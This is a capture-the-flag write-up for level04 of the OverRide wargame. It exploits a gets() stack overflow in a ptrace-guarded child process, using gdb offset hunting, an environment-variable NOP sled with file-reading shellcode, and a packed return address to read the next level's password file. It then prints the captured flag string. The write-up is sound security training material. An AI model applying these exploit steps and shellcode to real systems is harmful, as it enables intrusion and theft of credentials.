# Solution

Here is the C code


```c
#include <unistd.h>
#include <memory.h>
#include <stdio.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>

int main(int argc, const char **argv, const char **envp)
{
  int   status;
  char  buffer[128];
  long  ret;
  pid_t pid;

  pid = fork();
  memset(buffer, 0, sizeof(buffer));
  ret = 0;
  status = 0;
  if ( pid )
  {
      // loop to check if child is dead or not also check everytime the EAX register,
      // if value is equal to 11 this would mean that execve() is called,
      // this will kill the child process and exit the main process if 11 is found.
    do
    {
      wait(&status);
      if (  WTERMSIG(status) || WIFSIGNALED(status) )
      {
        puts("child is exiting...");
        return 0;
      }
      ret = ptrace(PTRACE_PEEKUSER, pid, 44, 0);
    } while ( ret != 11 );
    puts("no exec() for you");
    kill(pid, 9);
  }
  else
  {
    prctl(1, 1); //
    ptrace(PTRACE_TRACEME, 0, 0, 0);
    puts("Give me some shellcode, k");
    gets(buffer);
  }
  return 0;
}
```

Here is exploit is a bit trickier than usual, first as you can see in the source code we have a bunch of comment that explain,
what the main process do and also what it check.

```c
// loop to check if child is dead or not also check everytime the EAX register,
// if value is equal to 11 this would mean that execve() is called,
// this will kill the child process and exit the main process if 11 is found.
```

So from this we can see that we have a normal buffer overflow exploit that is done in the child process but the trickier part is,
that we need to be sure that our shellcode will not contain the execve call.

So for this we will be using this [shellcode](https://shell-storm.org/shellcode/files/shellcode-73.html), 
this shellcode is a file reader meaning that you provide a file path then it will read the file.

So now let's try to find the offset value for the buffer overflow and then let's prepare the payload for our exploit.

Let's run `gdb-gef` so we can find the offset value.

```sh
gef➤  b main
Breakpoint 1 at 0x80486cd (2 locations)
gef➤  set follow-fork-mode child
```

Here we break on main and set follow-fork-mode to child this will allow gdb to follow the child process this is where we can overflow.

```sh
gef➤  r
gef➤  pattern create 200
[+] Generating a pattern of 200 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
```

We create a debrujin string so we can find the offset for the craft of the payload.

```sh
gef➤  c
Give me some shellcode, k
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
```

This will result in a segfault and from here we need to find where we will segfault for that we need to print the value of the register `esp`,
because this will give us the offset that overwrite the address from the debrujin string.


```sh
0x6261616f in ?? ()
gef➤  x/xw $esp
0xffffcb50:     0x62616170
gef➤  pattern search 0x62616170
[+] Searching for '70616162'/'62616170' with period=4
[+] Found at offset 160 (little-endian search) likely
```

Perfect now we know that the offset to cause an overwrite of the return address is 156. 
Why 156 and not 160 like the return value said from the pattern search because 160 is the full overwritten address,
where 156 is the begining of that overwrite so basically 156 byte to attain the return address + 4 byte to overwrite the address,
this give us 160 byte offset.


We can test that to be sure by running the binary with `A*156` and `B*4`.


```sh
gef➤ r < <(python -c 'print "A"*156 + "B"*4')
gef➤ c
0x42424242 in ?? ()
gef➤
```

As we can see this work the 4 byte after 156 will overwrite the return address.


So now we need to craft our payload that will contain the shellcode modified with the right proper path and a nop sled,
this is done like this to be sure that the provided return address will be dropped inside a nop sled to hit our shellcode.

Since we have the control of the environment we can provide our nop sled + shellcode inside an environment variable like this

```sh
export SHELLCODE=$(perl -e 'print "\x90"x200 . "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass"')
```

Now we just need to find the address of the said environment variable named SHELLCODE to do so you have two way to do it.

You can find the address by using GDB,
You can find the address by creating a program that will print the address (this only works if you ASLR off or precisily ASLR set to 2).

So we will do the second way because it's more reliable because gdb add environment variable LINES, COLUMNS.
Also other environment variable will be changed and will find themselve with different value.

So here is the c program that we will use


```c
#include <stdlib.h>
#include <stdio.h>


int main(int ac, char **av, char **envp) {
    printf("%p\n", getenv("SHELLCODE"));
    return 0;
}
```

We need to compile this as 32 bit since the binary that we try to exploit is 32 bit also, 
and it need to have the same number of character as name.

```sh
level04@OverRide:~$ gcc -m32 /tmp/env.c -o /tmp/levelXX                                                                                                                                                                                                                      
level04@OverRide:~$ /tmp/levelXX
0xffffd7ca
level04@OverRide:~$
```
Something also really important to get the proper address you need to launch this program into your home,
if you changed of directory also you need to relaunch the program from the home to get the new address.

So now we have the address we need to pack that address and run the program buffer overflow it with the proper address. 

```py
#!/usr/bin/env python3
import struct

struct.pack("<I", 0xffffd7d9)
# Output: b'\xd9\xd7\xff\xff'
```

If the address here changed it's normal it's because i did switch from /tmp dir to home dir.
So now let's run the program to get the flag.
```sh
level04@OverRide:~$ (python -c 'print "A"*156 + "\xd9\xd7\xff\xff"') | ./level04 
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
child is exiting...
level04@OverRide:~$
```

We get the next flag. 
